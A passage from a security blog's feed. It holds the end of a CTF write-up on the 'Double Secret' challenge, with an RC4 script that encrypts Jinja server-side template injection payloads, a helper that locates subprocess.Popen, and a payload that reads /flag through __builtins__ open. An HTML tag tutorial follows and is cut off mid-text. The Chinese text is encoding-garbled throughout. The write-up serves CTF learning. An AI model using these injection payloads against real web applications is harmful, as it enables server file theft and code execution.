src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145643489.png" alt="image-20220403145643489"></p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150038070.png" alt="image-20220403150038070"></p><p>æ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼Œå°è¯•è®¿é—®ä¸‹secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150107744.png" alt="image-20220403150107744"></p><p>é‚£æˆ‘å°±æŠŠsecretå½“ä½œå‚æ•°ï¼Œä¼ å…¥ä¸€ä¸ªå€¼è¯•ä¸€è¯•</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150322198.png" alt="image-20220403150322198"></p><p>å¾ˆæ˜æ˜¾ï¼Œå®ƒæŠŠæˆ‘è¾“å…¥å¾—å€¼è¿›è¡Œäº†ä¸€ä¸ªåŠ å¯†</p><p>æ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼Œéšä¾¿è¾“å…¥ä¸€äº›å­—ç¬¦ä¸²ï¼Œå®ƒå°±çˆ†é”™äº†ï¼Œï¼Œï¼Œ</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150432386.png" alt="image-20220403150432386"></p><p>å¯»æ‰¾å¯åˆ©ç”¨çš„ä¿¡æ¯</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150631904.png" alt="image-20220403150631904"></p><p>æ‰¾åˆ°äº†åŠ å¯†æ–¹å¼æ˜¯RC4,å­˜åœ¨renderï¼Œåº”è¯¥æ˜¯æ¨¡æ¿æ³¨å…¥</p><p>è¿™æ˜¯ä¸€ä¸ªRC4åŠ å¯†è„šæœ¬</p><pre><code>import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯    # print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot; %quote(cipher))    #print(&quot;åŠ å¯†åçš„è¾“å‡º(ç»è¿‡ç¼–ç ):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;&quot;)</code></pre><p>é¦–å…ˆåˆ—å‡ºæ‰€æœ‰å­ç±»</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151137684.png" alt="image-20220403151137684"></p><p>ä¼ ç»™secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151206120.png" alt="image-20220403151206120"></p><p>å¯»æ‰¾å¯åˆ©ç”¨å­ç±»</p><p>ç»™å‡ºä¸€ä¸ªè„šæœ¬</p><p>find.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;subprocess.Popen&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>å¯»æ‰¾warnings.catch_warningsç±»</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152312044.png" alt="image-20220403152312044"></p><p>payload</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__['__builtins__']['open']('/flag').read()&#125;&#125;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152255110.png" alt="image-20220403152255110"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;é¢˜ç›®åˆ—è¡¨&quot;&gt;&lt;a href=&quot;#é¢˜ç›®åˆ—è¡¨&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®åˆ—è¡¨&quot;&gt;&lt;/a&gt;é¢˜ç›®åˆ—è¡¨&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Webæ–¹å‘ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[b01lers2020]Welco</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="åˆ·é¢˜" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="https://sakurahack-y.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>htmlå­¦ä¹ ç¬”è®°</title>
    <link href="https://sakurahack-y.github.io/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-03-24T07:11:45.000Z</published>
    <updated>2022-03-26T16:51:46.402Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ç®€å•çš„HTMLé¡µé¢æ¶æ„"><a href="#ç®€å•çš„HTMLé¡µé¢æ¶æ„" class="headerlink" title="ç®€å•çš„HTMLé¡µé¢æ¶æ„"></a>ç®€å•çš„HTMLé¡µé¢æ¶æ„</h1><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;charset  ç¼–ç  gbk gbk2312 utf-8</code></pre><h1 id="HTMLå¸¸è§æ ‡ç­¾"><a href="#HTMLå¸¸è§æ ‡ç­¾" class="headerlink" title="HTMLå¸¸è§æ ‡ç­¾"></a>HTMLå¸¸è§æ ‡ç­¾</h1><h2 id="metaæ ‡ç­¾"><a href="#metaæ ‡ç­¾" class="headerlink" title="metaæ ‡ç­¾"></a>metaæ ‡ç­¾</h2><pre><code class="html">&lt;meta&gt; å…ƒç´ å¯æä¾›æœ‰å…³é¡µé¢çš„å…ƒä¿¡æ¯ï¼ˆmeta-informationï¼‰ï¼Œæ¯”å¦‚é’ˆå¯¹æœç´¢å¼•æ“å’Œæ›´æ–°é¢‘åº¦çš„æè¿°å’Œå…³é”®è¯ã€‚è®¾ç½®ç½‘ç«™å…³é”®å­—meta name=&quot;keywords&quot; content=&quot;ç½‘ç»œå®‰å…¨ï¼ŒWEBæ¸—é€ï¼Œæ•°æ®å®‰å…¨ï¼Œæ¸—é€æµ‹è¯•ï¼Œå®‰å…¨åŸ¹è®­&quot; /&gt;&lt;link&gt; æ ‡ç­¾å®šä¹‰æ–‡æ¡£ä¸å¤–éƒ¨èµ„æºçš„å…³ç³»ã€‚&lt;script&gt; å¼•å…¥jsæ–‡ä»¶æ³¨é‡Š&lt;!--è¿™æ˜¯ä¸€æ®µæ³¨é‡Šã€‚æ³¨é‡Šä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚--&gt;&lt;p&gt;è¿™æ˜¯ä¸€æ®µæ™®é€šçš„æ®µè½ã€‚&lt;/p&gt;</code></pre><p>ç®€å•demo</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;è¿™é‡Œæ˜¯sakuraçš„åšå®¢&lt;/title&gt;        &lt;meta name=&quot;keywords&quot; content=&quot;ç½‘ç»œå®‰å…¨ï¼Œæ¸—é€æµ‹è¯•ï¼Œä»£ç å®¡è®¡&quot;/&gt;        &lt;meta name=&quot;description&quot; content=&quot;è¿™æ˜¯sakuraçš„åšå®¢ï¼Œåˆ†äº«è‡ªå·±çš„å­¦ä¹ ç»éªŒ&quot; /&gt;        &lt;meta name=&quot;author&quot; content=&quot;sakura&quot; /&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>æ•ˆæœå›¾:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154159328.png" alt="image-20220324154159328"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154219201.png" alt="image-20220324154219201"></p><h2 id="æ ‡é¢˜æ ‡ç­¾"><a href="#æ ‡é¢˜æ ‡ç­¾" class="headerlink" title="æ ‡é¢˜æ ‡ç­¾"></a>æ ‡é¢˜æ ‡ç­¾</h2><pre><code class="html">ç”±å¤§åˆ°å°&lt;h1&gt;h1&lt;/h1&gt;&lt;h2&gt;h2&lt;/h2&gt;&lt;h3&gt;h3&lt;/h3&gt;&lt;h4&gt;h4&lt;/h4&gt;&lt;h5&gt;h5&lt;/h5&gt;&lt;h6&gt;6&lt;/h6&gt;&lt;/br&gt; æ¢è¡Œæ ‡ç­¾&lt;hr&gt;æ¢è¡Œçº¿æ ‡ç­¾</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155054152.png" alt="image-20220324155054152"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155038536.png" alt="image-20220324155038536"></p><h2 id="æ–‡æœ¬å±æ€§"><a href="#æ–‡æœ¬å±æ€§" class="headerlink" title="æ–‡æœ¬å±æ€§"></a>æ–‡æœ¬å±æ€§</h2><pre><code class="html">&lt;strong&gt;åŠ ç²—&lt;/strong&gt;&lt;b&gt;&lt;/b&gt;åŠ ç²—&lt;i&gt;&lt;/i&gt;æ–œä½“&lt;u&gt;&lt;/u&gt; ä¸‹åˆ’çº¿&lt;sup&gt;&lt;/sup&gt;ä¸Šæ ‡&lt;sub&gt;&lt;/sub&gt;ä¸‹æ ‡&lt;del&gt;&lt;/del&gt; åˆ é™¤çº¿&lt;font&gt;&lt;/font&gt; è§„å®šå­—ä½“å±æ€§    size å­—ä½“çš„å¤§å°    color å­—ä½“é¢œè‰²    ä»£ç æ ·å¼åŸæ ·è¾“å‡º&lt;pre&gt;&lt;/pre&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324163340955.png" alt="image-20220324163340955"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324162943229.png" alt="image-20220324162943229"></p><h2 id="formè¡¨å•"><a href="#formè¡¨å•" class="headerlink" title="formè¡¨å•"></a>formè¡¨å•</h2><p>formè¡¨å• è§„å®šå½“æäº¤è¡¨å•æ—¶å‘ä½•å¤„å‘é€è¡¨å•æ•°æ®</p><p>method æäº¤çš„æ–¹æ³•æœ‰ getã€post</p><p>è§„å®šåœ¨å‘é€è¡¨å•æ•°æ®ä¹‹å‰å¦‚ä½•å¯¹å…¶è¿›è¡Œç¼–ç ï¼š</p><p><strong>enctype å±æ€§å¯èƒ½çš„å€¼ï¼š</strong></p><p>â€‹        application/x-www-form-urlencoded</p><p>â€‹        multipart/form-data</p><p>â€‹        text/plain</p><p><strong>inputæ ‡ç­¾:</strong></p><p>nameï¼šåŒæ ·æ˜¯è¡¨ç¤ºçš„è¯¥æ–‡æœ¬è¾“å…¥æ¡†åç§°ã€‚</p><p>sizeï¼šè¾“å…¥æ¡†çš„é•¿åº¦å¤§å°ã€‚</p><p>maxlengthï¼šè¾“å…¥æ¡†ä¸­å…è®¸è¾“å…¥å­—ç¬¦çš„æœ€å¤§æ•°ã€‚</p><p>valueï¼šè¾“å…¥æ¡†ä¸­çš„é»˜è®¤å€¼</p><p>readonlyï¼šè¡¨ç¤ºè¯¥æ¡†ä¸­åªèƒ½æ˜¾ç¤ºï¼Œä¸èƒ½æ·»åŠ ä¿®æ”¹ã€‚</p><p><strong>inputçš„ç±»å‹:</strong></p><p>type=password å¯†ç è¾“å…¥æ¡†</p><p>type=file æ–‡ä»¶ä¸Šä¼ </p><p>type=hidden éšè—åŸŸ</p><p>button æŒ‰é’®</p><p>checkbox å¤é€‰æ¡†</p><p>radio å•é€‰æ¡†</p><p>type=submit æäº¤æŒ‰é’®</p><p>type=reset  é‡ç½®æŒ‰é’®</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;è¿™æ˜¯ä¸€ä¸ªè¡¨å•e&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;            &lt;label&gt;ç”¨æˆ·å: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;30&quot; maxlength=&quot;6&quot; value=&quot;sakura&quot; readonly=&quot;&quot; /&gt;&lt;/br&gt;            &lt;label&gt;å¯†&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ç :&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;  /&gt;&lt;/br&gt;            &lt;label&gt;æŠ€&amp;nbsp;èƒ½:&lt;/label&gt;å®‰å…¨å¼€å‘&lt;input type=&quot;checkbox&quot; /&gt;æ¸—é€æµ‹è¯•&lt;input type=&quot;checkbox&quot; /&gt;&lt;/br&gt;            &lt;label&gt;æ€§&amp;nbsp;åˆ«:&lt;/label&gt;ç”·&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot; /&gt;å¥³&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;2&quot; /&gt;            &lt;input type=&quot;hidden&quot; value=&quot;1&quot; /&gt;&lt;/br&gt;            &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot; /&gt;            &lt;input type=&quot;reset&quot; value=&quot;é‡ç½®&quot; /&gt;            &lt;input type=&quot;button&quot; value=&quot;button&quot; /&gt;        &lt;/form&gt;        &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;            &lt;input type=&quot;file&quot; value=&quot;file&quot; /&gt;            &lt;input type=&quot;submit&quot; /&gt;        &lt;/form&gt;            &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324210305845.png" alt="image-20220324210305845"></p><h2 id="aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾"><a href="#aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾" class="headerlink" title="aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾"></a>aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾</h2><pre><code class="html">aæ ‡ç­¾çš„ä½œç”¨ï¼šå°±æ˜¯ç”¨äºæ§åˆ¶ç•Œé¢ä¸é¡µé¢ä¹‹é—´çš„è·³è½¬é»˜è®¤å°±æ˜¯selfselfï¼šç”¨äºåœ¨å½“å‰é€‰é¡¹å¡ä¸­è·³è½¬ï¼Œä¹Ÿå°±æ˜¯ä¸æ–°å»ºé¡µé¢è·³è½¬_blank ï¼šç”¨äºåœ¨æ–°çš„é€‰é¡¹å¡ä¸­è·³è½¬ï¼Œä¹Ÿå°±æ˜¯æ–°å»ºé¡µé¢è·³è½¬&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;self&quot;&gt;ç™¾åº¦&lt;/a&gt;&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;ç™¾åº¦&lt;/a&gt;_blank    åœ¨æ–°çª—å£ä¸­æ‰“å¼€è¢«é“¾æ¥æ–‡æ¡£ã€‚_self    é»˜è®¤ã€‚åœ¨ç›¸åŒçš„æ¡†æ¶ä¸­æ‰“å¼€è¢«é“¾æ¥æ–‡æ¡£ã€‚_parent    åœ¨çˆ¶æ¡†æ¶é›†ä¸­æ‰“å¼€è¢«é“¾æ¥æ–‡æ¡£ã€‚_top    åœ¨æ•´ä¸ªçª—å£ä¸­æ‰“å¼€è¢«é“¾æ¥æ–‡æ¡£ã€‚</code></pre><h2 id="é”šæ–‡æœ¬"><a href="#é”šæ–‡æœ¬" class="headerlink" title="é”šæ–‡æœ¬"></a>é”šæ–‡æœ¬</h2><pre><code class="html">&lt;a name=&quot;top&quot;&gt;é”šç‚¹&lt;/a&gt;&lt;a href=&quot;#top&quot;&gt;é”šç‚¹&lt;/a&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212519652.png" alt="image-20220324212519652"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212536673.png" alt="image-20220324212536673"></p><h2 id="imgæ ‡ç­¾"><a href="#imgæ ‡ç­¾" class="headerlink" title="imgæ ‡ç­¾"></a>imgæ ‡ç­¾</h2><pre><code class="html">img å…ƒç´ å‘ç½‘é¡µä¸­åµŒå…¥ä¸€å¹…å›¾åƒã€‚&lt;img src=&quot;img/sakura.jpg&quot; width=&quot;400&quot; height=&quot;500&quot; alt=&quot;logo&quot;/&gt;alt è§„å®šå›¾åƒçš„æ›¿ä»£æ–‡æœ¬ã€‚src  è§„å®šæ˜¾ç¤ºå›¾åƒçš„urlwidth è§„å®šå›¾ç‰‡çš„é«˜åº¦height è§„å®šå›¾ç‰‡çš„å®½åº¦</code></pre><p>  <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324213845918.png" alt="image-20220324213845918"></p><h2 id="tableè¡¨æ ¼"><a href="#tableè¡¨æ ¼" class="headerlink" title="tableè¡¨æ ¼"></a>tableè¡¨æ ¼</h2><pre><code class="html">&lt;caption&gt;æˆ‘çš„æ ‡é¢˜&lt;/caption&gt;è¡¨æ ¼å¸¦æ ‡é¢˜border è¾¹æ¡†width å®½åº¦height é«˜åº¦colspan åˆå¹¶è¡Œrowspan åˆå¹¶ç«–&lt;th&gt;&lt;/th&gt; å®šä¹‰è¡¨æ ¼å†…çš„è¡¨å¤´å•å…ƒæ ¼&lt;tr&gt;è¡Œ&lt;/tr&gt;&lt;td&gt;è¡¨æ ¼&lt;/td&gt;cellpadding å•å…ƒè¾¹ä¸å†…å®¹çš„ç©ºç™½cellspacing å•å…ƒæ ¼çš„ç©ºç™½</code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;table border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;10&quot;&gt;            &lt;caption&gt;HYå’ŒWYFâ¤&lt;/caption&gt;            &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;å§“å&lt;/th&gt;&lt;th&gt;å¹´é¾„&lt;/th&gt;&lt;th&gt;åœ¨ä¸€èµ·æ—¶é—´&lt;/th&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;HY&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;td rowspan=&quot;2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;299å¤©&lt;/td&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;WYF&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;/tr&gt;        &lt;/table&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324220335722.png" alt="image-20220324220335722"></p><h2 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h2><pre><code class="html">&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><h3 id="æ— åºåˆ—è¡¨"><a href="#æ— åºåˆ—è¡¨" class="headerlink" title="æ— åºåˆ—è¡¨"></a>æ— åºåˆ—è¡¨</h3><pre><code class="html">    é¡¹ç›®ç¬¦å· square circle disc&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324221810168.png" alt="image-20220324221810168"></p><h3 id="æœ‰åºåˆ—è¡¨"><a href="#æœ‰åºåˆ—è¡¨" class="headerlink" title="æœ‰åºåˆ—è¡¨"></a>æœ‰åºåˆ—è¡¨</h3><pre><code class="html">    æ•°å­—åˆ—è¡¨ é»˜è®¤ æ•°å­—    å°å†™å­—æ¯åˆ—è¡¨     å¤§å†™å­—æ¯åˆ—è¡¨ A    ç½—é©¬å­—æ¯åˆ—è¡¨  I    å°å†™ç½—é©¬å­—æ¯åˆ—è¡¨ i&lt;ol type=&quot;1&quot;&gt; &lt;!--æœ‰åºåˆ—è¡¨--&gt;            &lt;li&gt;æš—æœˆå®æˆ˜é¡¹ç›®ä¹ ä¸å‡ºç½‘çš„æƒ…å†µä¸‹çš„å†…ç½‘å¤šåŸŸæ§æ¸—é€&lt;/li&gt;            &lt;li&gt;xp/2003å¼€å…³3389æŒ‡ä»¤&lt;/li&gt;            &lt;li&gt;ä¸€æ¡å‘½ä»¤ä¿®æ”¹windowsæ³¨å†Œè¡¨&lt;/li&gt;&lt;/ol&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324222526957.png" alt="image-20220324222526957"></p><h2 id="æ¡†æ¶ä½¿ç”¨"><a href="#æ¡†æ¶ä½¿ç”¨" class="headerlink" title="æ¡†æ¶ä½¿ç”¨"></a>æ¡†æ¶ä½¿ç”¨</h2><p><strong>frameset å…ƒç´ å¯å®šä¹‰ä¸€ä¸ªæ¡†æ¶é›†ã€‚å®ƒè¢«ç”¨æ¥ç»„ç»‡å¤šä¸ªçª—å£ï¼ˆæ¡†æ¶ï¼‰ã€‚æ¯ä¸ªæ¡†æ¶å­˜æœ‰ç‹¬ç«‹çš„æ–‡æ¡£ã€‚åœ¨å…¶æœ€ç®€å•çš„åº”ç”¨ä¸­ï¼Œframeset å…ƒç´ ä»…ä»…ä¼šè§„å®šåœ¨æ¡†æ¶é›†ä¸­å­˜åœ¨å¤šå°‘åˆ—æˆ–å¤šå°‘è¡Œã€‚æ‚¨å¿…é¡»ä½¿ç”¨ cols æˆ– rows å±æ€§ã€‚</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/clip_image002.png" alt="å¸ƒå±€"></p><p>frameset åœ¨ä¸€ä¸ªé¡µé¢ä¸­è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªæ¡†æ¶ ä¸èƒ½åµŒå¥—åœ¨bodyæ ‡ç­¾é‡Œ</p><p>iframe æ˜¯åœ¨htmlé¡µé¢å†…åµŒå…¥æ¡†æ¶ æ¡†æ¶å†…å¯ä»¥è¿æ¥å¦ä¸€ä¸ªé¡µé¢</p><p> <strong>framesetå±æ€§:</strong></p><p>â‘ border</p><p>è®¾ç½®æ¡†æ¶çš„è¾¹æ¡†ç²—ç»†ã€‚</p><p>â‘¡bordercolor</p><p>è®¾ç½®æ¡†æ¶çš„è¾¹æ¡†é¢œè‰²ã€‚</p><p>â‘¢frameborder</p><p>è®¾ç½®æ˜¯å¦æ˜¾ç¤ºæ¡†æ¶è¾¹æ¡†ã€‚è®¾å®šå€¼åªæœ‰0ã€1ï¼›0 è¡¨ç¤ºä¸è¦è¾¹æ¡†ï¼Œ1 è¡¨ç¤ºè¦æ˜¾ç¤ºè¾¹æ¡†ã€‚</p><p>â‘£cols</p><p>çºµå‘åˆ†å‰²é¡µé¢ã€‚å…¶æ•°å€¼è¡¨ç¤ºæ–¹æ³•æœ‰ä¸‰ç§ï¼šâ€œ30%ã€30ï¼ˆæˆ–è€…30pxï¼‰ã€<em>â€ï¼›æ•°å€¼çš„ä¸ªæ•°ä»£è¡¨åˆ†æˆçš„è§†çª—æ•°ç›®ä¸”æ•°å€¼ä¹‹é—´ç”¨â€œ,â€éš”å¼€ã€‚â€œ30%â€è¡¨ç¤ºè¯¥æ¡†æ¶åŒºåŸŸå å…¨éƒ¨æµè§ˆå™¨é¡µé¢åŒºåŸŸçš„30%ï¼›â€œ30â€è¡¨ç¤ºè¯¥åŒºåŸŸæ¨ªå‘å®½åº¦ä¸º30åƒç´ ï¼›â€œ</em>â€è¡¨ç¤ºè¯¥åŒºåŸŸå ç”¨ä½™ä¸‹é¡µé¢ç©ºé—´ã€‚ä¾‹å¦‚ï¼šcols=â€25%,200,*â€ è¡¨ç¤ºå°†é¡µé¢åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œå·¦é¢éƒ¨åˆ†å é¡µé¢30%ï¼Œä¸­é—´æ¨ªå‘å®½åº¦ä¸º200åƒç´ ï¼Œé¡µé¢ä½™ä¸‹çš„ä½œä¸ºå³é¢éƒ¨åˆ†ã€‚</p><p>â‘¤rows</p><p>æ¨ªå‘åˆ†å‰²é¡µé¢ã€‚æ•°å€¼è¡¨ç¤ºæ–¹æ³•ä¸æ„ä¹‰ä¸colsç›¸åŒã€‚</p><p>â‘¥framespacing</p><p>è®¾ç½®æ¡†æ¶ä¸æ¡†æ¶é—´çš„ä¿ç•™çš„ç©ºç™½è·ç¦»ã€‚</p><p> <strong>frameå±æ€§:</strong></p><p>â‘ name</p><p>è®¾ç½®æ¡†æ¶åç§°ã€‚æ­¤ä¸ºå¿…é¡»è®¾ç½®çš„å±æ€§ã€‚</p><p>â‘¡src</p><p>è®¾ç½®æ­¤æ¡†æ¶è¦æ˜¾ç¤ºçš„ç½‘é¡µåç§°æˆ–è·¯å¾„ã€‚æ­¤ä¸ºå¿…é¡»è®¾ç½®çš„å±æ€§ã€‚</p><p>â‘¢scrolling</p><p>è®¾ç½®æ˜¯å¦è¦æ˜¾ç¤ºæ»šåŠ¨æ¡ã€‚è®¾å®šå€¼ä¸ºauto, yes, noã€‚</p><p>auto åœ¨éœ€è¦çš„æƒ…å†µä¸‹å‡ºç°æ»šåŠ¨æ¡ï¼ˆé»˜è®¤å€¼ï¼‰</p><p>yes å§‹ç»ˆæ˜¾ç¤ºæ»šåŠ¨æ¡ï¼ˆå³ä½¿ä¸éœ€è¦ï¼‰</p><p>no  ä»ä¸æ˜¾ç¤ºæ»šåŠ¨æ¡ï¼ˆå³ä½¿éœ€è¦ï¼‰</p><p>â‘£bordercolor</p><p>è®¾ç½®æ¡†æ¶çš„è¾¹æ¡†é¢œè‰²ã€‚</p><p>â‘¤frameborder</p><p>è®¾ç½®æ˜¯å¦æ˜¾ç¤ºæ¡†æ¶è¾¹æ¡†ã€‚è®¾å®šå€¼åªæœ‰0ã€1ï¼›0 